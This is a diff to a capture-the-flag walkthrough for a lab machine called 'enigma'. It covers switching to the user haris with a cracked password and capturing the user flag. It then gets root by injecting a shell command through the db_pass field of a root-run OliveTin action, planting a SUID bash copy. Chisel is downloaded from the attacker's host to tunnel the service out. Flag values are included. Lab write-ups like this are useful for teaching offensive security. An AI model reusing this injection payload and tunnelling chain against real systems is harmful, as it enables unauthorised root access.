@@ -494,44 +494,228 @@ bestfriends    (?)
 ## Step 11: Privilege Pivot - haris User
 
 ### Switching Users
+```bash
+www-data@enigma:~/html/openstamanager/files$ su haris
+Password: bestfriends
+
+haris@enigma:/var/www/html/openstamanager/files$ whoami
+haris
+haris@enigma:/var/www/html/openstamanager/files$ id
+uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
+```
+
+**What Changed:**
+- `haris` is a real system user with a home directory
+- `haris` belongs to the `users` group
+- We can now access home directories
+
+### Capturing the User Flag
+```bash
+haris@enigma:/home$ cd haris
+haris@enigma:~$ cat user.txt
+40ed9898172b070c4e9c63d721b2f730
+```
+
 
 ![[Pasted image 20260820233904.png]]
 
+**User Flag:** `40ed9898172b070c4e9c63d721b2f730`
 
+
+
+
+---
+
+## Step 12: Privilege Escalation - Root
+
+### Discovering OliveTin
+
+**Why We Look for Root Processes:** To escalate privileges, we need to find processes running as root that we can interact with.
+```bash
+haris@enigma:~$ ps aux | grep root | grep -v "grep"
+```
+
+**Key Discovery:**
+```bash
+root        1440       1  0 17:41 ?        00:00:00 /usr/local/bin/OliveTin
+```
+
+**What is OliveTin?** OliveTin is an open-source automation tool that provides a web interface for running shell commands. It runs as root!
+
+### Analyzing OliveTin Configuration
+```bash
+haris@enigma:~$ cat /etc/OliveTin/config.yaml
+```
+
+**Critical Configuration:**
+```yaml
+# This setting effectively enables or disables guests.
+# If set to "true", then users will have to login to do anything.
+authRequireGuestsToLogin: false
+
+# Actions defined in the configuration
+actions:
+  - title: Backup Database
+    id: backup_database
+    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
+    arguments:
+      - name: db_user
+        type: ascii_identifier
+        default: backup_svc
+      - name: db_pass
+        type: password
+      - name: db_name
+        type: ascii_identifier
+        default: production
+```
+
+**Why This is Dangerous:**
+1. `authRequireGuestsToLogin: false` - Anyone can access the API!
+2. The `Backup Database` action uses `{{ db_pass }}` in a shell command
+3. This allows command injection through the `db_pass` parameter
+4. OliveTin runs as root, so commands execute with root privileges
+
+### The Command Injection Vector
+
+**Understanding the Vulnerability:**
+```bash
+mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
+```
+
+If we set `db_pass` to:
+```text
+x' ; install -m 4755 /bin/bash /tmp/.bs ; #
+```
+
+The executed command becomes:
+```bash
+mysqldump -u backup_svc -p'x' ; install -m 4755 /bin/bash /tmp/.bs ; #' production > /opt/backups/backup.sql
+```
+
+**Breakdown:**
+1. `x'` - Closes the single quote
+2. `;` - Ends the current command
+3. `install -m 4755 /bin/bash /tmp/.bs` - Installs a SUID bash binary
+4. `;` - Command separator
+5. `#` - Comments out the rest of the command
+
+### The Problem: OliveTin API Access
+
+**Issue:** SSH password authentication is disabled. We can't directly access OliveTin's API from our Kali machine.
+
+**Solution:** Use Chisel for port forwarding!
+
+### Chisel Port Forwarding Setup
+
+**Why Chisel?** Chisel is a TCP tunnel over HTTP, perfect for environments where direct SSH is blocked.
+
+**Step 1: Download Chisel on Kali**
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+mv chisel_1.9.1_linux_amd64 chisel
+chmod +x chisel
+```
 
 ![[Pasted image 20260821222959.png]]
 
 
+**Step 2: Start Chisel Server (Kali)**
+```bash
+./chisel server -p 8000 --reverse
+```
 
 ![[Pasted image 20260821222930.png]]
 
 
+**Step 3: Start HTTP Server to Transfer Chisel**
+```bash
+python3 -m http.server 80
+```
 
 ![[Pasted image 20260821222940.png]]
 
 
+**Step 4: Download Chisel on Target**
+```bash
+haris@enigma:/tmp$ wget http://10.10.14.163/chisel
+haris@enigma:/tmp$ chmod +x chisel
+```
+
+**Step 5: Connect Chisel Client (Target)**
+```bash
+haris@enigma:/tmp$ ./chisel client 10.10.14.163:8000 R:1337:127.0.0.1:1337
+```
+
 ![[Pasted image 20260821223019.png]]
 
+**What This Does:**
+- Tunnels OliveTin (port 1337) from the target to our Kali machine
+- We can now access `http://127.0.0.1:1337` in our browser!    
+
+### Accessing OliveTin Dashboard
+
+**Open in browser:** `http://127.0.0.1:1337`
+
+**What We See:**
+- OliveTin dashboard with various actions
+- "Backup Database" action is available
 
 
 ![[Pasted image 20260821223043.png]]
 
+
+### Executing the Command Injection
+
+**Fill in the fields:**
+- **db_user:** `backup_svc`
+- **db_pass:** `x' ; install -m 4755 /bin/bash /tmp/.bs ; #`
+- **db_name:** `production`
+
+**Click "Start"**
 
 
 ![[Pasted image 20260821223111.png]]
 
 
 
+**Result:**
+```
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+Usage: mysqldump [OPTIONS] database [tables]
+OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
+...
+```
+
+- **This is an error from mysqldump, but our command injection was successful!**
+
 ![[Pasted image 20260821223126.png]]
 
 
+### Getting Root Shell
 
+```bash
+haris@enigma:/tmp$ /tmp/.bs -p
+/bs-5.2.4# whoami
+root
+```
 
 ![[Pasted image 20260821223156.png]]
+-  **We are root!**
 
-
+### Capturing the Root Flag
+```bash
+root@enigma:~# cat /root/root.txt
+6216c952b0fdd68c7268be5a81a565c1
+```
 
 ![[Pasted image 20260821223205.png]]
 
+
+
+
+---
+
+## Step 13: Machine Owned
 
 
